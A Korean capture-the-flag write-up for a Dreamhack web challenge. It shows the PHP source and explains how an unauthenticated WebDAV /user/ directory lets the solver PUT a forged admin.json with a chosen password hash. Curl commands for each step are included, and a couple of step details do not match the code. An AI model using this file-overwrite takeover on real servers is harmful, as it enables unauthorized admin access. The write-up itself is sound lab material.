**문제 설명**

**Description
Really not SQL, Just JSON**

- login.php
    
```php
    <?php
    session_start();
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userDir = __DIR__ . '/user/';
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
    
        $filename = $username . '.json';
        $filepath = $userDir . $filename;
    
        if ($username !== "admin" && $username !== "guest") {
            $error = "User not found";
        } else {
            $userData = json_decode(file_get_contents($filepath), true);
            if ($userData['id'] !== $username){
                $error = "Error occured";
            } else if ($userData['password'] !== hash("sha256", $password)) {
                $error = "Invalid password";
            } else {
                $_SESSION['user'] = $username;
                $success = true;
            }
        }
        
    }
    ?>
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <link rel="stylesheet" href="/static/style.css">
    </head>
    <body>
    <div class="container">
        <h1>Login</h1>
        <form method="post" action="login.php">
            <label for="username">User ID</label>
            <input type="text" id="username" name="username" required>
    
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
    
            <button type="submit">Login</button>
        </form>
    </div>
    
    <?php if ($error): ?>
    <script>
        alert("<?= $error ?>");
    </script>
    <?php elseif ($success): ?>
    <script>
        alert("Hello <?= $username ?>");
        window.location.href = "/";
    </script>
    <?php endif; ?>
    
    </body>
    </html>

```
    
- index.php
    
```php
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Main Page</title>
        <link rel="stylesheet" href="/static/style.css">
    </head>
    <body>
    <div class="container">
        <h1>Welcome</h1>
        <ul>
            <li><a href="login.php">Login</a></li>
            <li><a href="edit_profile.php">Edit Profile</a></li>
        </ul>
    </div>
    </body>
    </html>
    
```
    
- flag.php
    
```php
    <?php 
    session_start();
    
    if ($_SESSION['user'] !== "admin") {
        http_response_code(403);
    } else {
        $file = file_get_contents('/flag');
        echo trim($file); 
    }
    
    ?>
```
    
- edit_profile.php
    
```php
    <?php
    session_start();
    
    if ($_SESSION['user'] !== "admin") {
        $error = "Only admin can edit user profile";
    }
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION['user'] === "admin") {
        $userDir = __DIR__ . '/user/';
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
    
        $filename = $username . '.json';
        $filepath = $userDir . $filename;
    
        if ($username !== "admin" && $username !== "guest") {
            $error = "User not found";
        } else {
            $userData = json_decode(file_get_contents($filepath), true);
    
            if ($userData['id'] !== $username){
                $error = "Error occured";
            }
            else {
                $userData['password'] = hash("sha256", $password);
                file_put_contents($filepath, json_encode($userData));
                $success = true;
            }
        }
    }
    ?>
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Edit Profile</title>
        <link rel="stylesheet" href="/static/style.css">
    </head>
    <body>
    <div class="container">
        <h1>Edit Profile</h1>
        <form method="post" action="edit_profile.php">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>
    
            <label for="password">New Password</label>
            <input type="password" id="password" name="password" required>
    
            <button type="submit">Update</button>
        </form>
    </div>
    
    <?php if ($error): ?>
    <script>
        alert("<?= $error ?>");
        window.location.href = "/";
    </script>
    <?php elseif ($success): ?>
    <script>
        alert("OK");
        window.location.href = "/";
    </script>
    <?php endif; ?>
    
    </body>
    </html>
    
```
    

`000-default.conf`에서 `/user/` 디렉토리에 `DAV On`이 설정되어 있음. WebDAV 모듈이 활성화되면서 인증 없이 `PUT`, `PROPFIND` 등의 HTTP 메서드로 해당 디렉토리의 파일을 직접 읽고 쓸 수 있게 됨.

코드를 더 살펴보면 소스코드에 저장된 sha256해시로 비밀번호를 검증하는 구조이다.

즉, edit_profile.php는 admin 세션이 있어야 비밀번호 변경이 가능하도록 막아놨는데 DAV가 열려있어서 이 로직을 우회하고 파일을 직접 덮어쓸 수 있는 것이다.

익스 짜보자

1. DAV 활성화 확인
    
```php
    curl -X OPTIONS -i http://host3.dreamhack.games:15734/user/
```
    
2. admin.json 구조 확인
    
```php
    curl http://host3.dreamhack.games:15734/user/admin.json
```
    
3. 비밀번호 sha256 계산 (PW를 임의로 mypassword로 설정함)
    
```php
    echo -n "mypassword" | sha256sum
    # 89e01536ac207279409d4de1e5253e01f4a1769e696db0d6062ca9b8f56767c8
```
    
4. PUT으로 admin.json 덮어쓰기
    
```php
    curl -X PUT http://host3.dreamhack.games:15734/user/admin.json \
      -d '{"id":"admin","password":"89e01536ac207279409d4de1e5253e01f4a1769e696db0d6062ca9b8f56767c8"}'
```
    
5. 웹에 들어가 원본 비밀번호로 로그인
    
    ID: admin
    PW: mypassword
    
6. /flag.txt로 들어가기
    - flag 발견!
        
<img width="918" height="206" alt="image (21)" src="https://github.com/user-attachments/assets/c04f6a76-3306-4718-836c-da19cd0b414b" />
